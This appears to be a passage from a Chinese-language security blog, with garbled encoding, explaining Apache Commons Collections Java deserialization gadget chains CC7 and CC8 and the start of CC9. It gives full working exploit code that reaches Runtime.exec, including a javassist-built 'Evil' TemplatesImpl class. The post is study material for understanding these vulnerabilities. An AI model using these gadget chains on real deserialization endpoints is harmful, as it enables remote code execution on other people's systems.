<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œ m è®¾ç½®ä¸º<code>LazyMap</code>å³å¯ RCE</p>
<p>è¿›ä¸€æ­¥åœ°ä½¿ç”¨äº†<code>HashTable</code>ä½œä¸ºå¤å†™ç‚¹ï¼Œè°ƒç”¨äº†<code>HashTable.reconstitutionPut</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br></code></pre></td></tr></table></figure>

<p>å¯¹åº”åˆ°<code>writeObject</code>å¯çŸ¥ï¼Œ<code>HashTable.put</code>é”®å€¼</p>
<p>è¿™ä¸ªä¸ä¼šå†™ï¼Œç›´æ¥è´´å‡ºæ¥</p>
<h3 id="Gadget-6"><a href="#Gadget-6" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        Map map1 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        Map map2 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">2</span>);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">2</span>);<br><br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(map1, <span class="hljs-number">2</span>);<br>        ht.put(map2, <span class="hljs-number">2</span>);<br>        map2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer, transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¸€äº›ç»†èŠ‚ï¼š</p>
<p><code>AbstractMap</code>æ˜¯<code>HashMap</code>çš„çˆ¶ç±»ï¼Œå› æ­¤åœ¨<code>HashTable.reconstitutionPut</code>è°ƒç”¨<code>LazyMap.equals</code>å³å¯</p>
<p>ç¬¬äºŒä¸ªå¾—<code>HashTable.put</code>ä¸¤æ¬¡ï¼Œä¸ç„¶åœ¨å¤å†™ç‚¹èµ°è¿›<code>reconstitutionPut</code>ä¸ä¼šè¿›å…¥ for</p>
<p><code>Hashtable.put</code>æ–¹æ³•æ–°å¢çš„å…ƒç´ ï¼Œæ˜¯å­˜å‚¨åœ¨<code>Hashtable$Entry</code>è¿™ä¸ªå†…éƒ¨ç±»é‡Œé¢çš„ï¼Œé‚£ä¹ˆè·å–å…ƒç´ ä¹Ÿæ˜¯åœ¨è¿™ä¸ªå†…éƒ¨ç±»è·å–çš„</p>
<p><code>LazyMap.put</code>æ–¹æ³•æ–°å¢çš„å…ƒç´ ï¼Œæ˜¯è°ƒç”¨<code>LazyMap.map.put</code>æ–¹æ³•æ–°å¢çš„ï¼Œå½“<code>map</code>å±æ€§ä¸º<code>HashMap</code>å¯¹è±¡çš„æ—¶å€™ï¼Œæ–°å¢çš„å…ƒç´ æ˜¯å­˜å‚¨åœ¨<code>HashMap$Node</code>å†…éƒ¨ç±»é‡Œé¢çš„ï¼Œæ³¨æ„<code>LazyMap</code>ç±»æ²¡æœ‰ put æ–¹æ³•ï¼Œè°ƒç”¨çš„æ˜¯å…¶çˆ¶ç±»çš„ put æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> StreamCorruptedException</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-keyword">int</span> hash = key.hashCode();<br>    <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> Entry&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€æ¬¡æ·»åŠ å…ƒç´ æ—¶ï¼Œæ˜¾ç„¶ for ä¸­çš„ if æ˜¯ä¸æ»¡è¶³çš„ï¼Œå› æ­¤è¦æ·»åŠ ä¸¤æ¬¡ï¼Œå€¼ä¸º<code>yy zZ</code>ï¼Œå› ä¸º<code>e.hash==hash</code>æ˜¯ hashCode ç®—æ³•å¯¼è‡´çš„ hash å†²çª</p>
<p>ç¬¬ä¸‰ä¸ªï¼Œ<code>decorate</code>å°è£…çš„ innermap ä¸èƒ½æ˜¯åŒä¸€ä¸ª<code>HashMap</code></p>
<p>ç¬¬å››ä¸ªï¼Œæœ€åè¿˜è¦ç§»é™¤ map2 çš„ yy é”®</p>
<p>åœ¨æ²¡æœ‰ç§»é™¤è¿™ä¸ªé”®çš„æ—¶å€™è°ƒè¯•å‘ç°ç¡®å® map2 å¤šå‡ºæ¥äº†è¿™ä¸ªé”®</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20221005230840200.png" srcset="/img/loading.gif" lazyload></p>
<p>å‰é¢æåˆ°è¿‡ï¼Œ<code>LazyMap</code>çš„<code>map</code>å±æ€§ä¸º<code>HashMap</code>å¯¹è±¡æ—¶ï¼Œå…¶æ–°å¢çš„å…ƒç´ æ˜¯å­˜å‚¨åœ¨<code>HashMap.Node</code>å†…éƒ¨ç±»ä¸­çš„ï¼Œè€Œæˆ‘ä»¬å‘<code>LazyMap</code>put äº†ä¸€ç»„ hash å†²çªçš„é”®(è¿™ä¸ªä¸¤ä¸ªé”®ç„¶åå­˜å‚¨åœ¨<code>HashMap.Node</code>)ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†<code>HashMap</code>å¦‚ä½•å¤„ç† hash å†²çªçš„äº†</p>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>LazyMap.put-&gt;HashMap.put</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (table == EMPTY_TABLE) &#123;<br>        inflateTable(threshold);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> putForNullKey(value);<br>    <span class="hljs-keyword">int</span> hash = hash(key);<br>    <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);<br>    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) &#123;<br>        Object k;<br>        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<br>            V oldValue = e.value;<br>            e.value = value;<br>            e.recordAccess(<span class="hljs-keyword">this</span>);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br><br>    modCount++;<br>    addEntry(hash, key, value, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addEntry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> hash, K key, V value, <span class="hljs-keyword">int</span> bucketIndex)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="hljs-keyword">null</span> != table[bucketIndex])) &#123;<br>        resize(<span class="hljs-number">2</span> * table.length);<br>        hash = (<span class="hljs-keyword">null</span> != key) ? hash(key) : <span class="hljs-number">0</span>;<br>        bucketIndex = indexFor(hash, table.length);<br>    &#125;<br><br>    createEntry(hash, key, value, bucketIndex);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯çŸ¥æ˜¯é€šè¿‡å•å‘é“¾è¡¨è§£å†³çš„</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_72753070/article/details/126120740">https://blog.csdn.net/weixin_72753070/article/details/126120740</a></p>
<p>ç‰ˆæœ¬åº”è¯¥ä¸ä¸€æ ·ï¼Œäº†è§£å³å¯</p>
<p>ç³»ç»Ÿæ€»æ˜¯å°†æ–°æ·»åŠ çš„ Entry å¯¹è±¡æ”¾å…¥ table æ•°ç»„çš„ bucketIndex ç´¢å¼•å¤„â€”â€”å¦‚æœ bucketIndex ç´¢å¼•å¤„å·²ç»æœ‰äº†ä¸€ä¸ª Entry å¯¹è±¡ï¼Œé‚£æ–°æ·»åŠ çš„ Entry å¯¹è±¡æŒ‡å‘åŸæœ‰çš„ Entry å¯¹è±¡ï¼ˆäº§ç”Ÿä¸€ä¸ª Entry é“¾ï¼‰ï¼Œå¦‚æœ bucketIndex ç´¢å¼•å¤„æ²¡æœ‰ Entry å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç¨‹åºä»£ç çš„ e å˜é‡æ˜¯ nullï¼Œä¹Ÿå°±æ˜¯æ–°æ”¾å…¥çš„ Entry å¯¹è±¡æŒ‡å‘ nullï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰äº§ç”Ÿ Entry é“¾</p>
<p>HashMap é‡Œé¢æ²¡æœ‰å‡ºç° hash å†²çªæ—¶ï¼Œæ²¡æœ‰å½¢æˆå•é“¾è¡¨æ—¶ï¼Œhashmap æŸ¥æ‰¾å…ƒç´ å¾ˆå¿«,get()æ–¹æ³•èƒ½å¤Ÿç›´æ¥å®šä½åˆ°å…ƒç´ ï¼Œä½†æ˜¯å‡ºç°å•é“¾è¡¨åï¼Œå•ä¸ª bucket é‡Œå­˜å‚¨çš„ä¸æ˜¯ä¸€ä¸ª Entryï¼Œè€Œæ˜¯ä¸€ä¸ª Entry é“¾ï¼Œç³»ç»Ÿåªèƒ½å¿…é¡»æŒ‰é¡ºåºéå†æ¯ä¸ª Entryï¼Œç›´åˆ°æ‰¾åˆ°æƒ³æœç´¢çš„ Entry ä¸ºæ­¢â€”â€”å¦‚æœæ°å¥½è¦æœç´¢çš„ Entry ä½äºè¯¥ Entry é“¾çš„æœ€æœ«ç«¯ï¼ˆè¯¥ Entry æ˜¯æœ€æ—©æ”¾å…¥è¯¥ bucket ä¸­ï¼‰ï¼Œé‚£ç³»ç»Ÿå¿…é¡»å¾ªç¯åˆ°æœ€åæ‰èƒ½æ‰¾åˆ°è¯¥å…ƒç´ </p>
<p>å½“åˆ›å»º HashMap æ—¶ï¼Œæœ‰ä¸€ä¸ªé»˜è®¤çš„è´Ÿè½½å› å­ï¼ˆload factorï¼‰ï¼Œå…¶é»˜è®¤å€¼ä¸º 0.75ï¼Œè¿™æ˜¯æ—¶é—´å’Œç©ºé—´æˆæœ¬ä¸Šä¸€ç§æŠ˜è¡·ï¼šå¢å¤§è´Ÿè½½å› å­å¯ä»¥å‡å°‘ Hash è¡¨ï¼ˆå°±æ˜¯é‚£ä¸ª Entry æ•°ç»„ï¼‰æ‰€å ç”¨çš„å†…å­˜ç©ºé—´ï¼Œä½†ä¼šå¢åŠ æŸ¥è¯¢æ•°æ®çš„æ—¶é—´å¼€é”€ï¼Œè€ŒæŸ¥è¯¢æ˜¯æœ€é¢‘ç¹çš„çš„æ“ä½œï¼ˆHashMap çš„ get() ä¸ put() æ–¹æ³•éƒ½è¦ç”¨åˆ°æŸ¥è¯¢ï¼‰ï¼›å‡å°è´Ÿè½½å› å­ä¼šæé«˜æ•°æ®æŸ¥è¯¢çš„æ€§èƒ½ï¼Œä½†ä¼šå¢åŠ  Hash è¡¨æ‰€å ç”¨çš„å†…å­˜ç©ºé—´</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190468">https://www.anquanke.com/post/id/190468</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190472">https://www.anquanke.com/post/id/190472</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p>
<h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><h3 id="Pre-7"><a href="#Pre-7" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-7"><a href="#é™åˆ¶-7" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 4.0</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-7"><a href="#åˆ©ç”¨é“¾-7" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.TreeBag</span><span class="hljs-selector-class">.readObject</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.bag</span><span class="hljs-selector-class">.AbstractMapBag</span><span class="hljs-selector-class">.doReadObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.put</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.TreeMap</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><span class="hljs-selector-class">.TransformingComparator</span><span class="hljs-selector-class">.compare</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-class">.newTransformer</span><br>    ... (TemplatesImpl gadget)<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-7"><a href="#å…³é”®ç±»-7" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TreeBag</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">TransformingComparator</span><br><span class="hljs-attribute">InvokerTransformer</span><br></code></pre></td></tr></table></figure>

<p>ä¸ CC2ã€CC4 çš„åŒºåˆ«åœ¨äºä½¿ç”¨äº†æ–°çš„è§¦å‘ç‚¹ TreeBag</p>
<h3 id="Gadget-7"><a href="#Gadget-7" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC8;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.bag.TreeBag;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(invokerTransformer);<br>        TreeBag treeBag = <span class="hljs-keyword">new</span> TreeBag(transformingComparator);<br>        treeBag.add(templatesimpl);<br>        setFieldValue(invokerTransformer,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(treeBag);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><h3 id="Pre-8"><a href="#Pre-8" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-8"><a href="#é™åˆ¶-8" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1-3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-8"><a href="#åˆ©ç”¨é“¾-8" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span> <span class="hljs-comment">//??BadAttributeValueExpException</span><br>		<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>			<span class="hljs-module-access"><span 